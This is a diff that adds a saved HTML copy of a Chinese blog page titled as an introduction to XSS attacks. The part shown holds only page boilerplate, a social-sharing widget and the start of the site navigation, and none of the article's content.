@@ -1,0 +1,685 @@
+<!DOCTYPE html>
+<html lang="zh-cn"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8"><script charset="utf-8" src="xss%E6%94%BB%E5%87%BB%E5%85%A5%E9%97%A8%20-%20bangerlee%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/id.php"></script><script src="xss%E6%94%BB%E5%87%BB%E5%85%A5%E9%97%A8%20-%20bangerlee%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/encoder.js" type="text/javascript"></script>
+<meta charset="utf-8">
+<title>xss攻击入门 - bangerlee - 博客园</title>
+<link type="text/css" rel="stylesheet" href="xss%E6%94%BB%E5%87%BB%E5%85%A5%E9%97%A8%20-%20bangerlee%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/blog-common.css">
+<link id="MainCss" type="text/css" rel="stylesheet" href="xss%E6%94%BB%E5%87%BB%E5%85%A5%E9%97%A8%20-%20bangerlee%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/bundle-Minyx2_Lite.css">
+<link title="RSS" type="application/rss+xml" rel="alternate" href="http://www.cnblogs.com/bangerlee/rss">
+<link title="RSD" type="application/rsd+xml" rel="EditURI" href="http://www.cnblogs.com/bangerlee/rsd.xml">
+<link type="application/wlwmanifest+xml" rel="wlwmanifest" href="http://www.cnblogs.com/bangerlee/wlwmanifest.xml">
+<script src="xss%E6%94%BB%E5%87%BB%E5%85%A5%E9%97%A8%20-%20bangerlee%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/jquery.js" type="text/javascript"></script>  
+<script type="text/javascript">var currentBlogApp = 'bangerlee', cb_enable_mathjax=false;</script>
+<script src="xss%E6%94%BB%E5%87%BB%E5%85%A5%E9%97%A8%20-%20bangerlee%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/blog-common.js" type="text/javascript"></script>
+<script src="xss%E6%94%BB%E5%87%BB%E5%85%A5%E9%97%A8%20-%20bangerlee%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/bundle-Minyx2_Lite.js" language="javascript" type="text/javascript"></script>
+</head>
+<body><link type="text/css" rel="stylesheet" href="xss%E6%94%BB%E5%87%BB%E5%85%A5%E9%97%A8%20-%20bangerlee%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/jiathis_share.css"><div style="height: auto; position: fixed; z-index: 100000000; top: 150px; right: 0px; overflow: hidden; width: 26px;" class="jiathis_style"><table cellpadding="0" cellspacing="0"><tbody style="background:transparent"><tr><td style="background:transparent"><img src="xss%E6%94%BB%E5%87%BB%E5%85%A5%E9%97%A8%20-%20bangerlee%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/r1.gif" style="cursor:pointer;" onmouseover="$CKE.over()" onclick="$CKE.center(this)"></td><td><div><div class="jiadiv_01"><div style="width:100%;background:#F2F2F2;border-bottom:1px solid #E5E5E5;line-height:200%;padding-left:5px;font-size:12px"><table width="100%"><tbody><tr class="jt_sharetitle"><td style="text-align:left;line-height:25px;font-size:14px;font-weight:bold;color:#000000;" align="left">分享到...</td><td style="text-align:right;" align="right"><img src="xss%E6%94%BB%E5%87%BB%E5%85%A5%E9%97%A8%20-%20bangerlee%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/img_exit.gif" style="opacity:0.5;filter:alpha(opacity=50);margin:0 10px;cursor:pointer;" onclick="$CKE.shareClose();" border="0"></td></tr></tbody></table></div><div class="jiadiv_02" style="width:100%;" id="jiathis_sers"><a href="javascript:;" onclick="jiathis_sendto('renren');return false;" class="jiatitle"><span class="jtico jtico_renren">人人网</span></a><a href="javascript:;" onclick="jiathis_sendto('copy');return false;" class="jiatitle"><span class="jtico jtico_copy">复制网址</span></a><a href="javascript:;" onclick="jiathis_sendto('email');return false;" class="jiatitle"><span class="jtico jtico_email">邮件</span></a><a href="javascript:;" onclick="jiathis_sendto('qzone');return false;" class="jiatitle"><span class="jtico jtico_qzone">QQ空间</span></a><a href="javascript:;" onclick="jiathis_sendto('tsina');return false;" class="jiatitle"><span class="jtico jtico_tsina">新浪微博</span></a><a href="javascript:;" onclick="jiathis_sendto('tqq');return false;" class="jiatitle"><span class="jtico jtico_tqq">腾讯微博</span></a><a href="javascript:;" onclick="jiathis_sendto('weixin');return false;" class="jiatitle"><span class="jtico jtico_weixin">微信</span></a><a href="javascript:;" onclick="jiathis_sendto('yixin');return false;" class="jiatitle"><span class="jtico jtico_yixin">易信</span></a><a href="javascript:;" onclick="jiathis_sendto('t163');return false;" class="jiatitle"><span class="jtico jtico_t163">网易微博</span></a><a href="javascript:;" onclick="jiathis_sendto('tsohu');return false;" class="jiatitle"><span class="jtico jtico_tsohu">搜狐微博</span></a><a href="javascript:;" onclick="jiathis_sendto('cqq');return false;" class="jiatitle"><span class="jtico jtico_cqq">QQ好友</span></a><a href="javascript:;" onclick="jiathis_sendto('kaixin001');return false;" class="jiatitle"><span class="jtico jtico_kaixin001">开心网</span></a><a href="javascript:;" onclick="jiathis_sendto('feixin');return false;" class="jiatitle"><span class="jtico jtico_feixin">飞信</span></a><a href="javascript:;" onclick="jiathis_sendto('douban');return false;" class="jiatitle"><span class="jtico jtico_douban">豆瓣</span></a><a href="javascript:;" onclick="jiathis_sendto('ishare');return false;" class="jiatitle"><span class="jtico jtico_ishare">一键分享</span></a><a href="javascript:;" onclick="$CKE.center(this);return false;" class="jiatitle"><span class="jtico jtico_jiathis">查看更多(122)</span></a><div style="clear:both"></div></div><div class="ckepopBottom" style="width:100%;"><div style="float:left;font-size:10px"><a href="http://www.jiathis.com/help/html/what-is-jiathis" class="link_01" style="color:#333333;" target="_blank">这是什么工具?</a></div><div style="float:right;font-size:11px;margin:0 5px 0 0;"><img src="xss%E6%94%BB%E5%87%BB%E5%85%A5%E9%97%A8%20-%20bangerlee%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/img_012.gif" align="absmiddle" border="0"><a href="http://www.jiathis.com/index2" style="color:#333333;padding:0 3px;" class="link_01" target="_blank">JiaThis</a></div><div style="clear:both"></div></div></div></div></td></tr></tbody></table></div><iframe style="position: fixed; display: none;" frameborder="0"></iframe><div style="height: auto; position: absolute; z-index: 100000000; display: none; top: 50%; left: 50%; overflow: auto;" class="jiathis_style"><div style="border:10px solid #7F7F7F; width:300px;"><div class="jiadiv_01" style="width:300px;"><div style="background:#F2F2F2;line-height:100%;height:30px;overflow:hidden;width:300px;"><table style="margin:5px 0 0 0;" width="100%"><tbody><tr class="jt_sharetitle" style="line-height:20px!important;"><td style="text-align:left;font-size:12px;" align="left">分享到各大网站</td><td align="right"><img src="xss%E6%94%BB%E5%87%BB%E5%85%A5%E9%97%A8%20-%20bangerlee%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/img_exit.gif" style="margin:0 4px;cursor:pointer;" onclick="$CKE.centerClose();" border="0"></td></tr></tbody></table></div><div class="searchTxtCont"><div style="background:url(http://v3.jiathis.com/code/images/img_so.gif) no-repeat center;height:30px; width:281px"><form onsubmit="return false;"><input class="searchTxt" name="" onclick="this.value='';this.style.color='#000';" value="输入网站名或拼音缩写" onkeyup="$CKE.choose(this);" type="text"></form></div></div><div id="jiathis_sharelist" class="jiadiv_02" style="width:300px;height:300px;overflow-y:auto;"><a href="javascript:;" onclick="jiathis_sendto('ishare');return false;" class="jiatitle"><span class="jtico jtico_ishare">一键分享</span><input value="ishare,一键分享,yjfx" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('ujian');return false;" class="jiatitle"><span class="jtico jtico_ujian">猜你喜欢</span><input value="ujian,猜你喜欢,cnxh" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('copy');return false;" class="jiatitle"><span class="jtico jtico_copy">复制网址</span><input value="copy,复制网址,fzwz" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('fav');return false;" class="jiatitle"><span class="jtico jtico_fav">收藏夹</span><input value="fav,收藏夹,scj" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('print');return false;" class="jiatitle"><span class="jtico jtico_print">打印</span><input value="print,打印,dy" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('email');return false;" class="jiatitle"><span class="jtico jtico_email">邮件</span><input value="email,邮件,yj" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('qzone');return false;" class="jiatitle"><span class="jtico jtico_qzone">QQ空间</span><input value="qzone,QQ空间,qqkj" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('tsina');return false;" class="jiatitle"><span class="jtico jtico_tsina">新浪微博</span><input value="tsina,新浪微博,xlwb" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('weixin');return false;" class="jiatitle"><span class="jtico jtico_weixin">微信</span><input value="weixin,微信,wx" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('tqq');return false;" class="jiatitle"><span class="jtico jtico_tqq">腾讯微博</span><input value="tqq,腾讯微博,txwb" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('tsohu');return false;" class="jiatitle"><span class="jtico jtico_tsohu">搜狐微博</span><input value="tsohu,搜狐微博,shwb" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('t163');return false;" class="jiatitle"><span class="jtico jtico_t163">网易微博</span><input value="t163,网易微博,wywb" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('renren');return false;" class="jiatitle"><span class="jtico jtico_renren">人人网</span><input value="renren,人人网,rrw" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('kaixin001');return false;" class="jiatitle"><span class="jtico jtico_kaixin001">开心网</span><input value="kaixin001,开心网,kxw" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('googleplus');return false;" class="jiatitle"><span class="jtico jtico_googleplus">Google+</span><input value="googleplus,Google+,googlej" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('yixin');return false;" class="jiatitle"><span class="jtico jtico_yixin">易信</span><input value="yixin,易信,yx" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('alibaba');return false;" class="jiatitle"><span class="jtico jtico_alibaba">阿里巴巴</span><input value="alibaba,阿里巴巴,albb" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('douban');return false;" class="jiatitle"><span class="jtico jtico_douban">豆瓣</span><input value="douban,豆瓣,db" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('xiaoyou');return false;" class="jiatitle"><span class="jtico jtico_xiaoyou">朋友网</span><input value="xiaoyou,朋友网,pyw" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('sdonote');return false;" class="jiatitle"><span class="jtico jtico_sdonote">麦库记事</span><input value="sdonote,麦库记事,mkjs" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('baidu');return false;" class="jiatitle"><span class="jtico jtico_baidu">百度搜藏</span><input value="baidu,百度搜藏,bdsc" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('taobao');return false;" class="jiatitle"><span class="jtico jtico_taobao">淘江湖</span><input value="taobao,淘江湖,tjh" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('ydnote');return false;" class="jiatitle"><span class="jtico jtico_ydnote">有道云笔记</span><input value="ydnote,有道云笔记,ydybj" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('189share');return false;" class="jiatitle"><span class="jtico jtico_189share">手机快传</span><input value="189share,手机快传,sjkc" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('tianya');return false;" class="jiatitle"><span class="jtico jtico_tianya">天涯社区</span><input value="tianya,天涯社区,tysq" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('feixin');return false;" class="jiatitle"><span class="jtico jtico_feixin">飞信</span><input value="feixin,飞信,fx" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('tieba');return false;" class="jiatitle"><span class="jtico jtico_tieba">百度贴吧</span><input value="tieba,百度贴吧,bdtb" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('qingbiji');return false;" class="jiatitle"><span class="jtico jtico_qingbiji">轻笔记</span><input value="qingbiji,轻笔记,qbj" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('tifeng');return false;" class="jiatitle"><span class="jtico jtico_tifeng">凤凰微博</span><input value="tifeng,凤凰微博,fhwb" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('youshi');return false;" class="jiatitle"><span class="jtico jtico_youshi">优士网</span><input value="youshi,优士网,ysw" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('fanfou');return false;" class="jiatitle"><span class="jtico jtico_fanfou">饭否</span><input value="fanfou,饭否,ff" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('diandian');return false;" class="jiatitle"><span class="jtico jtico_diandian">点点网</span><input value="diandian,点点网,ddw" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('mingdao');return false;" class="jiatitle"><span class="jtico jtico_mingdao">明道</span><input value="mingdao,明道,md" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('zsvs');return false;" class="jiatitle"><span class="jtico jtico_zsvs">中搜v商</span><input value="zsvs,中搜v商,zsvs" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('google');return false;" class="jiatitle"><span class="jtico jtico_google">谷歌</span><input value="google,谷歌,gg" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('buzz');return false;" class="jiatitle"><span class="jtico jtico_buzz">谷歌Buzz</span><input value="buzz,谷歌Buzz,ggbuzz" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('youdao');return false;" class="jiatitle"><span class="jtico jtico_youdao">有道书签</span><input value="youdao,有道书签,ydsq" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('cqq');return false;" class="jiatitle"><span class="jtico jtico_cqq">QQ好友</span><input value="cqq,QQ好友,cqq" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('qq');return false;" class="jiatitle"><span class="jtico jtico_qq">QQ书签</span><input value="qq,QQ书签,qqsq" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('msn');return false;" class="jiatitle"><span class="jtico jtico_msn">MSN</span><input value="msn,MSN,msn" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('pinterest');return false;" class="jiatitle"><span class="jtico jtico_pinterest">Pinterest</span><input value="pinterest,Pinterest,pinterest" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('huaban');return false;" class="jiatitle"><span class="jtico jtico_huaban">花瓣网</span><input value="huaban,花瓣网,hbw" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('duitang');return false;" class="jiatitle"><span class="jtico jtico_duitang">堆糖</span><input value="duitang,堆糖,dt" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('tyaolan');return false;" class="jiatitle"><span class="jtico jtico_tyaolan">摇篮微博</span><input value="tyaolan,摇篮微博,ylwb" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('115');return false;" class="jiatitle"><span class="jtico jtico_115">115收藏</span><input value="115,115收藏,115sc" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('hi');return false;" class="jiatitle"><span class="jtico jtico_hi">百度空间</span><input value="hi,百度空间,bdkj" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('gmail');return false;" class="jiatitle"><span class="jtico jtico_gmail">Gmail邮箱</span><input value="gmail,Gmail邮箱,gmailyx" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('hotmail');return false;" class="jiatitle"><span class="jtico jtico_hotmail">Hotmail邮箱</span><input value="hotmail,Hotmail邮箱,hotmailyx" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('xqw');return false;" class="jiatitle"><span class="jtico jtico_xqw">雪球</span><input value="xqw,雪球,xqw" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('hexun');return false;" class="jiatitle"><span class="jtico jtico_hexun">和讯</span><input value="hexun,和讯,hx" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('toeeee');return false;" class="jiatitle"><span class="jtico jtico_toeeee">南方微博</span><input value="toeeee,南方微博,nfwb" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('139mail');return false;" class="jiatitle"><span class="jtico jtico_139mail">139邮箱</span><input value="139mail,139邮箱,139yx" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('189mail');return false;" class="jiatitle"><span class="jtico jtico_189mail">189邮箱</span><input value="189mail,189邮箱,189yx" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('i139');return false;" class="jiatitle"><span class="jtico jtico_i139">爱分享</span><input value="i139,爱分享,afx" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('iwo');return false;" class="jiatitle"><span class="jtico jtico_iwo">WO+分享</span><input value="iwo,WO+分享,iwo" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('189cn');return false;" class="jiatitle"><span class="jtico jtico_189cn">翼友圈</span><input value="189cn,翼友圈,yyq" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('139');return false;" class="jiatitle"><span class="jtico jtico_139">移动微博</span><input value="139,移动微博,ydwb" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('tpeople');return false;" class="jiatitle"><span class="jtico jtico_tpeople">人民微博</span><input value="tpeople,人民微博,rmwb" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('cnfol');return false;" class="jiatitle"><span class="jtico jtico_cnfol">中金微博</span><input value="cnfol,中金微博,zjwb" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('txinhua');return false;" class="jiatitle"><span class="jtico jtico_txinhua">新华微博</span><input value="txinhua,新华微博,xhwb" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('caimi');return false;" class="jiatitle"><span class="jtico jtico_caimi">财迷</span><input value="caimi,财迷,cm" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('translate');return false;" class="jiatitle"><span class="jtico jtico_translate">谷歌翻译</span><input value="translate,谷歌翻译,ggfy" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('tuita');return false;" class="jiatitle"><span class="jtico jtico_tuita">推他</span><input value="tuita,推他,tt" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('mop');return false;" class="jiatitle"><span class="jtico jtico_mop">猫扑推客</span><input value="mop,猫扑推客,mptk" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('digu');return false;" class="jiatitle"><span class="jtico jtico_digu">嘀咕网</span><input value="digu,嘀咕网,dgw" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('xianguo');return false;" class="jiatitle"><span class="jtico jtico_xianguo">鲜果</span><input value="xianguo,鲜果,xg" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('faxianla');return false;" class="jiatitle"><span class="jtico jtico_faxianla">发现啦</span><input value="faxianla,发现啦,fxl" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('ganniu');return false;" class="jiatitle"><span class="jtico jtico_ganniu">赶牛网</span><input value="ganniu,赶牛网,gnw" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('miliao');return false;" class="jiatitle"><span class="jtico jtico_miliao">米聊</span><input value="miliao,米聊,ml" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('kansohu');return false;" class="jiatitle"><span class="jtico jtico_kansohu">搜狐随身看</span><input value="kansohu,搜狐随身看,shssk" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('51');return false;" class="jiatitle"><span class="jtico jtico_51">51社区</span><input value="51,51社区,51sq" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('ifengkb');return false;" class="jiatitle"><span class="jtico jtico_ifengkb">凤凰快博</span><input value="ifengkb,凤凰快博,fhkb" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('jcrb');return false;" class="jiatitle"><span class="jtico jtico_jcrb">法律微博</span><input value="jcrb,法律微博,flwb" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('gmw');return false;" class="jiatitle"><span class="jtico jtico_gmw">光明网</span><input value="gmw,光明网,gmw" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('leihou');return false;" class="jiatitle"><span class="jtico jtico_leihou">雷猴网</span><input value="leihou,雷猴网,lhw" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('thexun');return false;" class="jiatitle"><span class="jtico jtico_thexun">和讯微博</span><input value="thexun,和讯微博,hxwb" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('dream163');return false;" class="jiatitle"><span class="jtico jtico_dream163">游戏江湖</span><input value="dream163,游戏江湖,yxjh" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('masar');return false;" class="jiatitle"><span class="jtico jtico_masar">玛撒网</span><input value="masar,玛撒网,msw" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('binzhi');return false;" class="jiatitle"><span class="jtico jtico_binzhi">宾至网</span><input value="binzhi,宾至网,bzw" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('fb');return false;" class="jiatitle"><span class="jtico jtico_fb">Facebook</span><input value="fb,Facebook,facebook" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('twitter');return false;" class="jiatitle"><span class="jtico jtico_twitter">Twitter</span><input value="twitter,Twitter,twitter" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('tumblr');return false;" class="jiatitle"><span class="jtico jtico_tumblr">Tumblr</span><input value="tumblr,Tumblr,tumblr" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('reddit');return false;" class="jiatitle"><span class="jtico jtico_reddit">Reddit</span><input value="reddit,Reddit,reddit" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('instapaper');return false;" class="jiatitle"><span class="jtico jtico_instapaper">Instapaper</span><input value="instapaper,Instapaper,instapaper" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('pocket');return false;" class="jiatitle"><span class="jtico jtico_pocket">Pocket</span><input value="pocket,Pocket,pocket" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('wealink');return false;" class="jiatitle"><span class="jtico jtico_wealink">若邻网</span><input value="wealink,若邻网,rlw" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('leshou');return false;" class="jiatitle"><span class="jtico jtico_leshou">乐收</span><input value="leshou,乐收,ls" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('waakee');return false;" class="jiatitle"><span class="jtico jtico_waakee">挖客网</span><input value="waakee,挖客网,wkw" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('cyzone');return false;" class="jiatitle"><span class="jtico jtico_cyzone">创业邦</span><input value="cyzone,创业邦,cyb" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('99earth');return false;" class="jiatitle"><span class="jtico jtico_99earth">救救地球</span><input value="99earth,救救地球,jjdq" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('chouti');return false;" class="jiatitle"><span class="jtico jtico_chouti">抽屉网</span><input value="chouti,抽屉网,ctw" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('dig24');return false;" class="jiatitle"><span class="jtico jtico_dig24">递客网</span><input value="dig24,递客网,dkw" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('douban9dian');return false;" class="jiatitle"><span class="jtico jtico_douban9dian">豆瓣9点</span><input value="douban9dian,豆瓣9点,db9d" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('meilishuo');return false;" class="jiatitle"><span class="jtico jtico_meilishuo">美丽说</span><input value="meilishuo,美丽说,mls" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('mogujie');return false;" class="jiatitle"><span class="jtico jtico_mogujie">蘑菇街</span><input value="mogujie,蘑菇街,mgj" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('tianji');return false;" class="jiatitle"><span class="jtico jtico_tianji">天际网</span><input value="tianji,天际网,tjw" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('poco');return false;" class="jiatitle"><span class="jtico jtico_poco">Poco网</span><input value="poco,Poco网,pocow" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('yijee');return false;" class="jiatitle"><span class="jtico jtico_yijee">易集网</span><input value="yijee,易集网,yjw" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('pdfonline');return false;" class="jiatitle"><span class="jtico jtico_pdfonline">Pdf在线转换</span><input value="pdfonline,Pdf在线转换,pdfzxzh" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('printfriendly');return false;" class="jiatitle"><span class="jtico jtico_printfriendly">友好打印</span><input value="printfriendly,友好打印,yhdy" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('w3c');return false;" class="jiatitle"><span class="jtico jtico_w3c">W3c验证</span><input value="w3c,W3c验证,w3cyz" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('bitly');return false;" class="jiatitle"><span class="jtico jtico_bitly">Bit.ly</span><input value="bitly,Bit.ly,bitly" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('digg');return false;" class="jiatitle"><span class="jtico jtico_digg">Digg</span><input value="digg,Digg,digg" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('mailru');return false;" class="jiatitle"><span class="jtico jtico_mailru">Mail.ru</span><input value="mailru,Mail.ru,mail.ru" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('diigo');return false;" class="jiatitle"><span class="jtico jtico_diigo">Diigo</span><input value="diigo,Diigo,diigo" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('evernote');return false;" class="jiatitle"><span class="jtico jtico_evernote">EverNote</span><input value="evernote,EverNote,evernote" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('friendfeed');return false;" class="jiatitle"><span class="jtico jtico_friendfeed">FriendFeed</span><input value="friendfeed,FriendFeed,friendfeed" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('myspace');return false;" class="jiatitle"><span class="jtico jtico_myspace">Myspace</span><input value="myspace,Myspace,myspace" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('linkedin');return false;" class="jiatitle"><span class="jtico jtico_linkedin">LinkedIn</span><input value="linkedin,LinkedIn,linkedin" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('mixx');return false;" class="jiatitle"><span class="jtico jtico_mixx">Mixx</span><input value="mixx,Mixx,mixx" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('netlog');return false;" class="jiatitle"><span class="jtico jtico_netlog">NetLog</span><input value="netlog,NetLog,netlog" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('netvibes');return false;" class="jiatitle"><span class="jtico jtico_netvibes">Netvibes</span><input value="netvibes,Netvibes,netvibes" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('phonefavs');return false;" class="jiatitle"><span class="jtico jtico_phonefavs">Phonefavs</span><input value="phonefavs,Phonefavs,phonefavs" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('pingfm');return false;" class="jiatitle"><span class="jtico jtico_pingfm">Ping.fm</span><input value="pingfm,Ping.fm,ping.fm" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('plaxo');return false;" class="jiatitle"><span class="jtico jtico_plaxo">Plaxo</span><input value="plaxo,Plaxo,plaxo" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('delicious');return false;" class="jiatitle"><span class="jtico jtico_delicious">Delicious</span><input value="delicious,Delicious,delicious" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('wong');return false;" class="jiatitle"><span class="jtico jtico_wong">Mister Wong</span><input value="wong,Mister Wong,misterwong" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('stumbleupon');return false;" class="jiatitle"><span class="jtico jtico_stumbleupon">Stumbleupon</span><input value="stumbleupon,Stumbleupon,stumbleupon" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('plurk');return false;" class="jiatitle"><span class="jtico jtico_plurk">Plurk</span><input value="plurk,Plurk,plurk" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('funp');return false;" class="jiatitle"><span class="jtico jtico_funp">Funp</span><input value="funp,Funp,funp" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('myshare');return false;" class="jiatitle"><span class="jtico jtico_myshare">Myshare</span><input value="myshare,Myshare,myshare" type="hidden"></a><a href="javascript:;" onclick="jiathis_sendto('fwisp');return false;" class="jiatitle"><span class="jtico jtico_fwisp">Fwisp</span><input value="fwisp,Fwisp,fwisp" type="hidden"></a><div style="clear:both"></div></div><div class="centerBottom"><div style="float:left;font-size:10px;"><a href="http://www.jiathis.com/help/html/what-is-jiathis" class="link_01" style="color:#333333;" target="_blank">这是什么工具?</a></div><div style="float:right;font-size:11px;margin:0 10px 0 0;"><img src="xss%E6%94%BB%E5%87%BB%E5%85%A5%E9%97%A8%20-%20bangerlee%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/img_012.gif" align="absmiddle" border="none">&nbsp;<a href="http://www.jiathis.com/index2" style="color:#333333;" class="link_01" target="_blank">JiaThis</a></div><div style="clear:both"></div></div></div></div></div><iframe src="xss%E6%94%BB%E5%87%BB%E5%85%A5%E9%97%A8%20-%20bangerlee%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/jiathis_utility.htm" style="display: none;" frameborder="0"></iframe>
+<a name="top"></a>
+<div id="page_begin_html"><!-- JiaThis Button BEGIN -->
+
+
+<!-- JiaThis Button END --></div><script>load_page_begin_html();</script>
+
+
+<div id="container">
+    <a class="minyx" href="http://www.cnblogs.com/">代码改变世界</a>
+    <ul id="topMnu">
+        <!-- 统计数据 -->
+        <li>
+            
+                
+Posts - 28, 
+Articles - 64, 
+Comments - 154
+<!---->
+            
+        </li>
+        <!-- 这边可以增加一些链接 -->
+        <!-- 博客园 -->
+        <li><a href="http://www.cnblogs.com/">Cnblogs</a></li>
